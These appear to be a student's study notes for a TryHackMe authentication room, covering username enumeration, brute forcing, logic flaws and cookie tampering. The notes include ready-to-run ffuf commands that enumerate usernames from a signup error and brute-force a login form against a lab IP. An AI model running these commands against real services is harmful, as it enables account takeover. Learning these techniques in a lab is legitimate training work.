## Username Enumeration

>[!info]-
> you can utilize errors to to collect information that helps you build a wordlist

you can do that using the fuff tool in the sign up page

```
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.48.146.219/customers/signup -mr "username already exists" -s
```
use this only in the tryhackme network


## Brute Force

after discovering valid usernames use them to brute force your way in the login page 
```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.48.146.219/customers/login -fc 20
```



## Logic Flaw

>[!quote] Definition
> Sometimes authentication processes contain logic flaws. A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker.

![[Pasted image 20260422205623.png]]

there might be flaws in the sign up logic you could inject emails or passwords or other stuff in the headers  or whatever



## Cookie Tampering

>[!info]-
> Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges. If you need a refresher on cookies, check out the [HTTP In Detail](https://tryhackme.com/room/httpindetail) room on task 6.